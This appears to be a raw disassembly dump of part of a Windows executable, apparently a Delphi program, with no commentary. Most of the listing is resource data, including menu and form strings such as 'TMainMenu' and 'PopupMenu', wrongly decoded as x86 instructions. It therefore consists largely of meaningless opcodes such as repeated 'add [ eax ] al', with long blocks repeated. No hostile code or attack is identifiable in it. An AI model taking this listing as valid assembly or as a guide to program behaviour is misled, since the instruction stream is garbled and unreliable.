in al 0x7
sub_44f149
inc esp
add [ eax ] al
mov [ ecx ] es
add eax [ eax ]
add eax 0x756e654d
jae r-xdata
dec eax
in eax dx
inc esp
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
add [ eax - 0x13 ] cl
add [ eax + 0x35 ] ah
inc ebp
add [ ebp + edi + 0x45 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x0
add [ eax ] al
add eax [ eax ]
std
inc eax
add al cl
int1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 ] al
inc esp
add [ eax ] ah
add [ eax ] al
mov al dh
inc esp
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esi - 0x573fffbb ] cl
inc ecx
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x3dd00045 ] dh
inc ebp
add [ eax ] bh
add [ edx ] al
xor [ ecx ] al
inc edx
add [ eax + 0x3 ] ah
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax + 0x34 ] dh
inc ebp
add [ edi + 0x430c0045 ] bl
inc ebp
add [ eax + 0x42 ] dl
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcl [ edx + esi * 8 ] 0x44
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xc8756e65
int1
inc esp
add [ ecx + esi * 8 ] bh
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] al
inc edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ ebx + ebp * 8 + 0x44 ] ah
add al dh
inc ecx
inc ebp
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
rol [ eax + eax + 0x48 ] cl
add [ eax ] al
call [ ebp + edi + 0x10045 ]
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
[ eax + 0x3c ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
pushad
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
dec ecx
insd
popad
jae r-xdata
sbb al 0xd3
inc esp
add [ eax ] cl
add bh bh
xchg esp eax
cmp eax 0x10045
jmp r-xdata
loopne r-xdata
jo r-xdata
outsb
je r-xdata
ja r-xdata
inc ecx
jne r-xdata
jne r-xdata
inc esp
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x44 ] bl
add [ esi ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
pop esp
inc esp
adc [ eax ] al
inc ecx
add [ eax ] al
dec [ ecx + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add bh bh
mov [ ecx + 0x45 ] es
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsd
dec ebp
jb r-xdata
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
je r-xdata
outsb
je r-xdata
popad
add al 0x78
inc ecx
add [ eax ] dh
add [ eax ] al
xor al 0x40
add [ esp + edi * 8 + 0x34a80041 ] bl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ebx
dec eax
hlt
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
xor al [ eax ]
or al 0x4a
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
je r-xdata
outsd
insd
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
fdivr st3
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7065646f
jmp 0x94f382
add [ eax ] dl
inc edx
inc ebp
add [ eax ] ah
inc edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
inc esp
jae r-xdata
add eax 0x756e654d
inc esp
add [ ebp - 0xb53ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsd
je r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
mov al [ 0x30044f3 ]
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
add al dh
inc ecx
inc ebp
add [ eax ] al
inc edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
or eax 0x6f42616d
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmc
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
outsb
jne r-xdata
outsd
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
js r-xdata
dec eax
outsd
je r-xdata
inc ebp
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x3dd00045 ] dh
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 2 ] cl
add ch dh
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
hlt
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pop eax
cmp al 0x45
or [ edi + 0x77 ] ecx
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jae r-xdata
jo r-xdata
add [ edx + ecx * 2 + 0x45 ] dl
add [ edx + ecx * 2 + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x740d0044 ] bl
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ ecx + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
sbb al 0xd3
inc esp
add [ eax ] cl
add bh bh
xchg esp eax
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
js r-xdata
outsb
jb r-xdata
hlt
loopne r-xdata
jmp r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x44f7 0x0
or [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
dec esp
jns r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dl
outsb
jo r-xdata
jle r-xdata
test [ fs : eax + eax + 0x14 ] 0xd0000000
add [ eax ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
je r-xdata
add [ eax ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
inc ecx
inc ecx
jne r-xdata
inc ebp
add [ eax ] bh
add [ edx ] al
xor [ ecx ] al
inc edx
add [ eax + 0x3 ] ah
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax + 0x1c004549 ] bl
cmp eax 0x35600045
inc ebp
add [ ebp + edi + 0x45 ] cl
add [ eax + 0x4a ] al
inc ebp
add al bh
dec edx
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
cmp eax 0x3dd00045
hlt
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x600041a0
mov [ 0xffffffffa4480041 ] al
inc ecx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ eax ] dl
inc esp
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
rcl [ eax - 0x9 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 + 0x44 ] ah
add [ eax + eax ] dl
add [ eax ] al
sar [ esi + 0x41 ] 0x1
xor [ edi - 0x586bffbe ] ah
inc edx
add [ edi + 0x42 ] dh
add [ eax - 0x59 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x44f7bc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ eax + eax + 0x8 ] 0xf0000000
movsd [ edi ] [ esi ]
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x44f7
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444498
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44f446
inc esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
xor al 0x40
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
or al 0x4a
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp ebx
inc esp
add [ ebp - 0xb53ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
hlt
add [ eax ] dl
inc edx
inc ebp
add [ eax ] ah
inc edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
add al dh
inc ecx
inc ebp
add [ eax ] al
inc edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsb
jne r-xdata
outsd
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
js r-xdata
dec eax
outsd
je r-xdata
inc ebp
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x3dd00045 ] dh
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 2 ] cl
add ch dh
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pop eax
cmp al 0x45
or [ edi + 0x77 ] ecx
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
jae r-xdata
jo r-xdata
add [ edx + ecx * 2 + 0x45 ] dl
add [ edx + ecx * 2 + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ ecx + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
sbb al 0xd3
inc esp
add [ eax ] cl
add bh bh
xchg esp eax
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
js r-xdata
outsb
jb r-xdata
hlt
loopne r-xdata
jmp r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x44f7 0x0
or [ eax ] al
add [ eax ] al
jo r-xdata
inc ebx
push 0x65676e61
dec esp
jns r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add al dl
outsb
jo r-xdata
jle r-xdata
test [ fs : eax + eax + 0x14 ] 0xd0000000
add [ eax ] dh
add bh bh
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
je r-xdata
add [ eax ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
inc ecx
inc ecx
jne r-xdata
inc ebp
add [ eax ] bh
add [ edx ] al
xor [ ecx ] al
inc edx
add [ eax + 0x3 ] ah
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ eax + 0x1c004549 ] bl
cmp eax 0x35600045
inc ebp
add [ ebp + edi + 0x45 ] cl
add [ eax + 0x4a ] al
inc ebp
add al bh
dec edx
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
cmp eax 0x3dd00045
hlt
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x600041a0
mov [ 0xffffffffa4480041 ] al
inc ecx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ eax ] dl
inc esp
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
rcl [ eax - 0x9 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 + 0x44 ] ah
add [ eax + eax ] dl
add [ eax ] al
sar [ esi + 0x41 ] 0x1
xor [ edi - 0x586bffbe ] ah
inc edx
add [ edi + 0x42 ] dh
add [ eax - 0x59 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x44f7bc90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ eax + eax + 0x8 ] 0xf0000000
movsd [ edi ] [ esi ]
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x44f7
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444498
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44f50e
inc esp
add [ ecx + esi * 8 ] bh
inc esp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
jmp r-xdata
add [ ebx + esi * 8 + 0x44 ] bl
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
push edx
jne r-xdata
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jo r-xdata
je r-xdata
outsb
jne r-xdata
outsd
outsd
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pop eax
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
js r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
dec [ ecx + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
sbb al 0xd3
inc esp
add [ eax ] cl
add bh bh
xchg esp eax
cmp eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x44f7 0x0
or [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9c65646f
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
inc ecx
je r-xdata
inc ebx
push 0x65676e61
dec esp
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
outsb
jb r-xdata
hlt
add [ eax ] al
js r-xdata
je r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov esp 0x600041a0
mov [ 0xffffffffa4480041 ] al
inc ecx
add [ eax ] dl
mov eax [ 0xffffffffa18c0041 ]
inc ecx
add [ eax ] dl
inc esp
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
rcl [ eax - 0x9 ] 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 8 + 0x44 ] ah
add [ eax + eax ] dl
add [ eax ] al
sar [ esi + 0x41 ] 0x1
test [ fs : eax + eax + 0x14 ] 0xd0000000
add [ eax ] dh
add bh bh
jo r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
jle r-xdata
add al dl
outsb
jo r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
je r-xdata
add [ eax ] dh
mov esp 0x44f7
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
xor [ edi - 0x586bffbe ] ah
inc edx
add [ edi + 0x42 ] dh
add [ eax - 0x59 ] ah
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
test [ eax + eax + 0x8 ] 0xf0000000
movsd [ edi ] [ esi ]
inc edx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
imul esi [ ebx + 0x74 ] 0x44f7bc90
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_444498
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_44f5c2
inc ebp
add [ eax + 0x3a ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
js r-xdata
jae r-xdata
add [ edx + ecx * 2 + 0x45 ] dl
add [ edx + ecx * 2 + 0x45 ] bl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jo r-xdata
outsb
jb r-xdata
hlt
outsb
jne r-xdata
outsd
outsb
je r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pop eax
cmp al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
js r-xdata
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
dec [ ecx + eax * 2 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
